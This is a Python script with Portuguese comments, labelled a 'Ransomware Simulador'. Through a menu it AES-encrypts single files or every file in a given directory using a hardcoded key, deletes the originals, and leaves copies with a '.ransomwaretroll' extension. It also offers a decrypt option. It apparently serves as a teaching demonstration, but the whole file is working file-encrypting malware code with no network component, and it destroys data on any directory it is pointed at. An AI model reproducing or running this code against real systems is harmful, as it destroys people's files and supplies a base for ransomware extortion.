import os
import pyaes

# ------------------------------------------
# Função para criptografar arquivos
# ------------------------------------------
def criptografar_arquivo(file_name, key):
    """
    Criptografa um arquivo específico usando AES (CTR mode).
    :param file_name: Nome do arquivo a ser criptografado.
    :param key: Chave de criptografia (16 bytes).
    """
    try:
        # Abrir o arquivo em modo leitura binária
        with open(file_name, 'rb') as file:
            file_data = file.read()

        # Criar instância do AES no modo CTR
        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografar os dados do arquivo
        crypto_data = aes.encrypt(file_data)

        # Remover o arquivo original
        os.remove(file_name)

        # Criar novo arquivo criptografado
        new_file_name = file_name + '.ransomwaretroll'
        with open(new_file_name, 'wb') as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo {file_name} criptografado com sucesso como {new_file_name}!")
    except Exception as e:
        print(f"Erro ao criptografar o arquivo {file_name}: {e}")

# ------------------------------------------
# Função para descriptografar arquivos
# ------------------------------------------
def descriptografar_arquivo(file_name, key):
    """
    Descriptografa um arquivo criptografado usando AES (CTR mode).
    :param file_name: Nome do arquivo a ser descriptografado.
    :param key: Chave de criptografia (16 bytes).
    """
    try:
        # Abrir o arquivo criptografado
        with open(file_name, 'rb') as file:
            encrypted_data = file.read()

        # Criar instância do AES no modo CTR
        aes = pyaes.AESModeOfOperationCTR(key)

        # Descriptografar os dados
        decrypted_data = aes.decrypt(encrypted_data)

        # Criar novo arquivo descriptografado
        original_file_name = file_name.replace('.ransomwaretroll', '')
        with open(original_file_name, 'wb') as new_file:
            new_file.write(decrypted_data)

        # Remover o arquivo criptografado
        os.remove(file_name)

        print(f"Arquivo {file_name} descriptografado com sucesso como {original_file_name}!")
    except Exception as e:
        print(f"Erro ao descriptografar o arquivo {file_name}: {e}")

# ------------------------------------------
# Função para criptografar todos os arquivos de um diretório
# ------------------------------------------
def criptografar_diretorio(diretorio, key):
    """
    Criptografa todos os arquivos de um diretório.
    :param diretorio: Caminho do diretório.
    :param key: Chave de criptografia (16 bytes).
    """
    try:
        arquivos = os.listdir(diretorio)
        for arquivo in arquivos:
            caminho_completo = os.path.join(diretorio, arquivo)
            if os.path.isfile(caminho_completo):
                criptografar_arquivo(caminho_completo, key)
    except Exception as e:
        print(f"Erro ao criptografar o diretório {diretorio}: {e}")

# ------------------------------------------
# Chave de criptografia
# ------------------------------------------
key = b'testeransomwares'

# ------------------------------------------
# Menu principal
# ------------------------------------------
def main():
    print("==== Ransomware Simulador ====")
    print("1. Criptografar um arquivo")
    print("2. Descriptografar um arquivo")
    print("3. Criptografar todos os arquivos de um diretório")
    escolha = input("Escolha uma opção: ")

    if escolha == '1':
        file_name = input("Digite o nome do arquivo a ser criptografado: ")
        criptografar_arquivo(file_name, key)
    elif escolha == '2':
        file_name = input("Digite o nome do arquivo a ser descriptografado: ")
        descriptografar_arquivo(file_name, key)
    elif escolha == '3':
        diretorio = input("Digite o caminho do diretório: ")
        criptografar_diretorio(diretorio, key)
    else:
        print("Opção inválida!")

if __name__ == "__main__":
    main()
